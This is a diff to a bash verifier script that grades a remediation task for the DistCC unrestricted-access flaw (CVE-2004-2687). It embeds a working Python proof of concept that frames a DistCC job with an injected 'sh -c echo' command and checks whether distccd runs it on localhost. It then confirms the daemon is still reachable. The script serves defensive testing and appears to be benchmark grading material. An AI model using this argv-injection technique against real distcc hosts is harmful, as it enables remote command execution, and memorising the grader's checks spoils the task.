@@ -1,87 +1,115 @@
 #!/bin/bash
-# Verification script for Scenario 15: DistCC Unrestricted Access (RCE)
-# Check 1 (PoC): distccd should NOT accept remote commands without restriction
-# Check 2 (Regression): distcc should be properly restricted or stopped
+# Scenario 15: DistCC Unrestricted Access -> RCE (CVE-2004-2687)
+#
+# BEHAVIOURAL verifier. It speaks the real DistCC protocol to the RUNNING
+# distccd and asks it to run a command (the argv-injection that distccd will
+# execute as a "compiler"). If the command's output comes back, the box is
+# exploitable. It does NOT grep the --allow flag or /start.sh, and it NEVER
+# starts distccd -- a dead daemon is a real failure.
+#
+# The remediation keeps distccd running but restricts --allow to a trusted
+# non-loopback range, so this localhost PoC is denied by the access list while
+# the compile farm stays available. Editing /start.sh without restarting the
+# live daemon leaves it exploitable (notrestart => FAIL).
+#
+# Exit 0 = remediated, Exit 1 = still vulnerable or broken.
+set -u
+HOST=127.0.0.1
+PORT=3632
 
-##############################################################################
-# PoC Check: distccd should not be running unrestricted
-##############################################################################
-
-DISTCC_PID=$(pgrep -f 'distccd' 2>/dev/null)
-
-if [ -n "$DISTCC_PID" ]; then
-    # distccd is running -- check if it has --allow restriction
-    DISTCC_CMDLINE=$(cat /proc/$DISTCC_PID/cmdline 2>/dev/null | tr '\0' ' ')
-
-    if echo "$DISTCC_CMDLINE" | grep -q '\-\-allow'; then
-        # Has --allow flag -- check it is not wide open (e.g., 0.0.0.0/0)
-        if echo "$DISTCC_CMDLINE" | grep -qE '\-\-allow\s+0\.0\.0\.0/0'; then
-            echo "FAIL: distccd has --allow 0.0.0.0/0 which allows all hosts."
-            exit 1
-        else
-            echo "PASS: distccd is running with --allow restriction."
-        fi
-    else
-        echo "FAIL: distccd is running without --allow flag -- unrestricted access."
-        exit 1
-    fi
-else
-    # distccd not running — check if /start.sh still configures it without --allow
-    if [ -f /start.sh ] && grep -q 'distccd' /start.sh; then
-        if grep -q '\-\-allow' /start.sh; then
-            if grep -qE '\-\-allow\s+0\.0\.0\.0/0' /start.sh; then
-                echo "FAIL: distccd configured with --allow 0.0.0.0/0 in /start.sh — allows all hosts."
-                exit 1
-            else
-                echo "PASS: distccd configured with --allow restriction in /start.sh (not currently running)."
-            fi
-        else
-            echo "FAIL: distccd in /start.sh has no --allow flag — unrestricted access when started."
-            exit 1
-        fi
-    else
-        echo "PASS: distccd is not running (service disabled)."
-    fi
+# distccd must already be running; the verifier must not start it.
+if ! pgrep -x distccd >/dev/null 2>&1; then
+    echo "FAIL [Regression]: distccd is not running -- a dead service is a failure" >&2
+    echo "                   (verify.sh must not start it)." >&2
+    exit 1
 fi
 
-##############################################################################
-# Additional PoC: Try to connect and execute a command via distcc protocol
-##############################################################################
-
-if [ -n "$DISTCC_PID" ]; then
-    # Attempt a basic distcc protocol command execution
-    # The distcc protocol sends DIST followed by argument count and arguments
-    # A simple test: try to connect to port 3632 from localhost
-    CONNECT_TEST=$(echo "" | nc -w 3 127.0.0.1 3632 2>/dev/null; echo $?)
-
-    if [ "$CONNECT_TEST" = "0" ] || netstat -tlnp 2>/dev/null | grep -q ':3632.*0.0.0.0'; then
-        # Port is open -- check if bound to 0.0.0.0 (all interfaces)
-        LISTEN_ADDR=$(netstat -tlnp 2>/dev/null | grep ':3632' | awk '{print $4}')
-        if echo "$LISTEN_ADDR" | grep -q '0.0.0.0:3632'; then
-            # Still listening on all interfaces, but we already checked --allow above
-            # If --allow is set, this is acceptable (the flag controls access)
-            echo "INFO: distccd listening on all interfaces but access is controlled via --allow."
-        fi
+# Wait (bounded) for the port to accept connections.
+UP=0
+for i in $(seq 1 20); do
+    if ss -tln 2>/dev/null | grep -q ":$PORT " || netstat -tln 2>/dev/null | grep -q ":$PORT "; then
+        UP=1; break
     fi
+    sleep 1
+done
+if [ "$UP" != 1 ]; then
+    echo "FAIL [Regression]: distccd is not listening on port $PORT -- service down/broken." >&2
+    exit 1
 fi
 
-##############################################################################
-# Regression Check: If distcc is running, it should be properly restricted
-# If stopped, that is also an acceptable remediation
-##############################################################################
+# PoC: DistCC argv injection. Send a job whose "compiler" argv is
+# `sh -c 'echo <marker>'`; distccd executes it and returns stdout in the SOUT
+# token. Seeing the marker == arbitrary command execution.
+MARKER="DISTCC_RCE_$$_$(date +%s)"
+POC_OUT=$(MARKER="$MARKER" python - "$HOST" "$PORT" <<'PYEOF' 2>/dev/null
+import socket, sys, os
+host = sys.argv[1]; port = int(sys.argv[2])
+marker = os.environ["MARKER"]
+argv = ["sh", "-c", "echo " + marker, "#", "-c", "main.c", "-o", "main.o"]
+req = "DIST%08x" % 1
+req += "ARGC%08x" % len(argv)
+for a in argv:
+    req += "ARGV%08x" % len(a) + a
+doti = "int main(){return 0;}\n"
+req += "DOTI%08x" % len(doti) + doti
+try:
+    s = socket.socket(); s.settimeout(10); s.connect((host, port))
+    s.sendall(req)
+    data = ""
+    while True:
+        b = s.recv(4096)
+        if not b:
+            break
+        data += b
+    s.close()
+except Exception:
+    data = ""
+sys.stdout.write(data)
+PYEOF
+)
 
-if [ -n "$DISTCC_PID" ]; then
-    # distcc is running -- verify it responds on localhost (for legitimate local use)
-    if netstat -tlnp 2>/dev/null | grep -q ':3632'; then
-        echo "PASS: distccd is running and listening (restricted mode)."
-    else
-        echo "FAIL: distccd process exists but is not listening on port 3632."
-        exit 1
-    fi
-else
-    # distcc is stopped -- this is acceptable, verify the system is otherwise functional
-    echo "PASS: distccd is stopped -- service has been disabled as remediation."
+if echo "$POC_OUT" | grep -q "$MARKER"; then
+    echo "FAIL [PoC]: distccd executed an injected command via the DistCC protocol" >&2
+    echo "            (marker '$MARKER' returned in the SOUT token) -- remote code execution." >&2
+    exit 1
 fi
+echo "PASS [PoC]: distccd did not execute the injected command from this host (access denied)."
+
+# Regression: the daemon is still up and REACHABLE for legitimate clients.
+#
+# A listening-socket check alone is firewall-agnostic: an `iptables -j DROP` (or
+# any block-all mitigation) that denies EVERY client — including the trusted
+# compile farm — would leave the socket in LISTEN yet make the PoC time out, so
+# a total block would masquerade as the intended `--allow` restriction. The
+# correct fix (scope --allow to a trusted range) keeps distccd ACCEPTING TCP
+# connections (it completes the handshake, then denies the job by client IP),
+# whereas a block-all mitigation drops the SYN and the connection never
+# establishes. So we require the TCP handshake itself to still succeed.
+if ! pgrep -x distccd >/dev/null 2>&1; then
+    echo "FAIL [Regression]: distccd is no longer running." >&2
+    exit 1
+fi
+CONN=$(python - "$HOST" "$PORT" <<'PYEOF' 2>/dev/null
+import socket, sys
+host = sys.argv[1]; port = int(sys.argv[2])
+s = socket.socket(); s.settimeout(5)
+try:
+    s.connect((host, port))
+    sys.stdout.write("CONNECT_OK")
+except Exception:
+    sys.stdout.write("CONNECT_FAIL")
+finally:
+    s.close()
+PYEOF
+)
+if [ "$CONN" != "CONNECT_OK" ]; then
+    echo "FAIL [Regression]: distccd did not accept a TCP connection on port $PORT —" >&2
+    echo "                   the service has been blocked/bricked for ALL clients," >&2
+    echo "                   not merely restricted to a trusted range." >&2
+    exit 1
+fi
+echo "PASS [Regression]: distccd still accepts TCP connections on port $PORT"
+echo "                   (reachable by legitimate clients; PoC denied by --allow)."
 
 echo "All checks passed."
 exit 0
